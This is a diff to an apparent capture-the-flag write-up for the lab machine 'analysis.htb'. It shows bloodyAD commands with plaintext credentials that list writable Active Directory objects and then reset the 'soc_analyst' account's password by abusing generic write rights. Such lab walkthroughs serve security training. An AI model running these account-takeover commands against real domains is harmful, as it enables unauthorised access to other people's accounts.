@@ -540,7 +540,7 @@ SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\badam:DMrB8
 
 I have compromised `wsmith`
 
-# Writable objects as `wsmith`
+# Compromising `soc_analyst`
 
 ```python
 ❯❯❯ bloodyAD --host dc-analysis.analysis.htb -d analysis.htb -u wsmith -p 'DMrB8YUcC5%2' get writable                                                    
@@ -563,9 +563,12 @@ permission: CREATE_CHILD
 
 I have some permissions over `soc_analyst`
 
-And now using `--detail` in the get writable command i see this priv is what bloodhound w
+And now using `--detail` in the get writable command i see this priv is what bloodhound would consider genericAll
 
 ```python
-
+❯❯❯ bloodyAD --host dc-analysis.analysis.htb -d analysis.htb -u wsmith -p 'DMrB8YUcC5%2' set password 'soc_analyst' 'Password123!'
+[+] Password changed successfully!
 ```
+
+
 
